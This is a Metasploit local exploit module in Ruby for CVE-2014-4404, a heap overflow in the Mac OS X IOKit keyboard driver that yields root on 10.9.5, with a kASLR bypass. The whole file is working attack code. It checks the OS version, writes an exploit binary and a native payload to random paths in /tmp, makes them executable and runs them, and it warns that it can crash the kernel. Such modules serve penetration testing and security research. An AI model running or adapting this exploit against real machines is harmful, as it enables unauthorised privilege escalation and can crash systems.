# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = ManualRanking # Can cause kernel crash

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Mac OS X IOKit Keyboard Driver Root Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
        A heap overflow in IOHIKeyboardMapper::parseKeyMapping allows kernel memory
        corruption in Mac OS X before 10.10. By abusing a bug in the IORegistry, kernel
        pointers can also be leaked, allowing a full kASLR bypass.


        The issue has been patched silently in Yosemite.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Ian Beer&#039;, # discovery, advisory, publication, and a most excellent blog post
          &#039;joev&#039; # copy/paste monkey
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2014-4404&#039; ],
          [ &#039;URL&#039;, &#039;http://googleprojectzero.blogspot.com/2014/11/pwn4fun-spring-2014-safari-part-ii.html&#039; ],
          # Heap overflow:
          [ &#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=40&#039; ],
          # kALSR defeat:
          [ &#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=126&#039; ]
        ],
      &#039;Platform&#039;      => &#039;osx&#039;,
      &#039;Arch&#039;          => ARCH_X86_64,
      &#039;Targets&#039;       => [
        [ &#039;Mac OS X 10.9.5 Mavericks x64 (Native Payload)&#039;, { } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;
    ))
  end

  def check
    if ver_lt(osx_ver, "10.10")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    exploit_path = File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;CVE-2014-4404&#039;)
    binary_exploit = File.read(File.join(exploit_path, &#039;key_exploit&#039;))
    binary_payload   = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
    exploit_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
    payload_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"

    print_status("Writing exploit file as &#039;#{exploit_file}&#039;")
    write_file(exploit_file, binary_exploit)
    register_file_for_cleanup(exploit_file)

    print_status("Writing payload file as &#039;#{payload_file}&#039;")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)

    print_status("Executing payload...")
    cmd_exec("chmod +x #{exploit_file}")
    cmd_exec("chmod +x #{payload_file}")
    cmd_exec("#{exploit_file} #{payload_file}")
  end

  def osx_ver
    cmd_exec("sw_vers -productVersion").to_s.strip
  end

  def ver_lt(a, b)
    Gem::Version.new(a) < Gem::Version.new(b)
  end

end

